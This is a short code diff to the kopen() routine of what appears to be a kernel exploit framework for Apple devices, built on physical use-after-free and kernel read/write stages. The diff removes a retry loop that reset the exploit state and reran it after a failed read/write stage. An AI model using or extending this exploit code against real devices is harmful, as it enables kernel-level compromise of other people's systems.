@@ -166,8 +166,6 @@ void kfd_free(struct kfd* kfd)
 
 u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
 {
-    int fail = -1;
-    
     timer_start();
 
     const u64 puaf_pages_min = 16;
@@ -179,23 +177,8 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     assert(kwrite_method <= kwrite_sem_open);
 
     struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
-    
-retry:
     puaf_run(kfd);
-    
-    fail = krkw_run(kfd);
-    if(fail && (puaf_method == puaf_landa)) {
-        // Thanks: m1zole / dunkeyyfong
-        puaf_free(kfd);
-        info_free(kfd);
-        bzero(kfd, sizeof(struct kfd));
-        info_init(kfd);
-        puaf_init(kfd, puaf_pages, puaf_method);
-        krkw_init(kfd, kread_method, kwrite_method);
-        perf_init(kfd);
-        goto retry;
-    }
-    
+    krkw_run(kfd);
     info_run(kfd);
     perf_run(kfd);
     puaf_cleanup(kfd);
